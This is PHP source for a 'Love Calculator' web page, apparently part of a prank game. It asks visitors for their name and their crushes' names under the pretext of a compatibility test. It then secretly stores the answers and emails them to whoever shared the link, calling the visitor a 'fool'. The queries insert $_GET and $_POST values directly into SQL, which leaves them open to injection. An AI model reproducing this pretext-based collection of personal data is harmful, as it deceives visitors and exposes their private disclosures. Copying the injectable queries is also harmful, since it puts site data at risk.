<?php include "header.php"; 
ob_start();
?>


<?php   $user_code = $_GET['love_calculator'];  ?>



<div class="container">

</br>

<div class="row">
<div class="col-sm-8"></div>
<div class="col-sm-4" style="font-size:30px;"><a href="index.php" class="btn btn-default btn-lg">Home</a></div>
</div>

<center><div style="font-family:cursive; Color:purple; font-size:50px;"><u>Love Calculator</u></div></center>


<?php

if(!isMobileDevice()){

echo'<center>


</center>';

}
else{

echo'


';

}

?>

<div class="style="background-image:url('../lovegame/wp1.jpg'); background-repeat:no-repeat; background-size:cover;">
<div class="container">
<div class="row">
<div class="col-sm-1"></div>


<div class="col-sm-6"><img src="lv1.png"></div>

<div class="col-sm-5">
</br>

 <form action="" class="navbar-form navbar-left" method="POST" >
 <div class="form-group-sm">
        <div style="font-weight:bold; font-size:20px;">Your Name :</div>
	<input type="text" name="fool_name" size="30" class="form-control" placeholder="Enter Your Full Name" required>


<?php

echo'


';


?>



        <div style="font-weight:bold; font-size:20px;">Your Crush's Name :</div>
	<input type="text" name="lv_one" size="30" class="form-control" placeholder="Enter Your Crush Full Name" required></br></br>

        <div style="font-weight:bold; font-size:20px;">Second Crush(Optional) : </div>
	<input type="text" name="lv_two" size="30" class="form-control" placeholder="Second Crush (Optional)" ></br></br>
	
        <div style="font-weight:bold; font-size:20px;">Third Crush(Optional) : </div>
        <input type="text" name="lv_three" size="30" class="form-control" placeholder="Second Crush (Optional)" >


<?php

echo'

';


?>


        <input class="btn btn-danger" type="submit" name="fool" value="Calculate True Love">

<?php

echo'

';


?>

</div>
</form>
</div>

</div>
</div>
</div>


<?php

$user_gm="";
$reg = @$_POST['fool'];
if($reg){



$fool_name = $_POST['fool_name'];
$lv_one = $_POST['lv_one'];
$lv_two = $_POST['lv_two'];
$lv_three = $_POST['lv_three'];

$query="SELECT * FROM love_calc WHERE link_gen='$user_code'";
  $sql = $con->query($query);

  $userCount = $sql->num_rows;
  if($userCount>0){
      while($row=$sql->fetch_assoc()){
            $user_gm = $row['username'];
            $email_user = $row['email'];
            $name = $row['name'];
  }
}
else echo'no user exist. sign In <a href="index.php">Here</a>';

$lv_one = strtolower($lv_one);
$lv_two = strtolower($lv_two);
$lv_three = strtolower($lv_three);


$sub="New Fool On Love Game - naiudan.com";
$text = 'Congratulation '.strtoupper($name).' ! You made fool to '.strtoupper($fool_name).' 
'.strtoupper($fool_name).'\'s crush name '.strtoupper($lv_one).'  '.strtoupper($lv_two).'  '.strtoupper($lv_three). '.';


$query = $con->query("INSERT INTO calc_db (username,fool_name,lv_one,lv_two,lv_three) VALUES('$user_gm','$fool_name','$lv_one','$lv_two','$lv_three') ");

mail("$email_user", $sub ,$text);

header("location:fool.php?name=$name&fool=$fool_name");
exit();
}

?>




<?php
ob_end_flush();
 // include "footer.php"; ?>